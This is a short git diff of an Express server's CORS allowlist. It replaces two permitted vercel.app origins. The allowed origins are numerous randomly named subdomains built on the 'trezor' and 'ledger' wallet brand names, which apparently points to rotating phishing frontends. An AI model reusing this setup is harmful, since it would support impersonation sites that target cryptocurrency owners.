@@ -12,8 +12,8 @@ const PORT = process.env.PORT || 3000;
 app.use(cors({
     origin: ["http://localhost:3000",
         "https://trezor-sepia-shyam-pod-paint-sigma-gole-324324-psi.vercel.app", //aws
-        "https://trezor-aws-rame-pod-paint-sigma-rolee-324324-psi.vercel.app", //website
-        "https://trezor-aws-o2o4-newcity-pod-paint-sigma-rolee-324324-psi.vercel.app",
+        "https://trezor-aws-dubai-pod-paint-sigma-rolee-324324-psi.vercel.app", //website
+        "https://trezor-aws-o2o4-newyork-pod-paint-sigma-rolee-324324-psi.vercel.app",
         "https://trezor-3wxu-sepia-shyam-pod-paint-sigma-gole-324324-psi.vercel.app",
         "https://ledger-two-phi-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
         "https://ledger-aws-phi-newyork-pod-paint-sigma-gole-324324-psi.vercel.app",
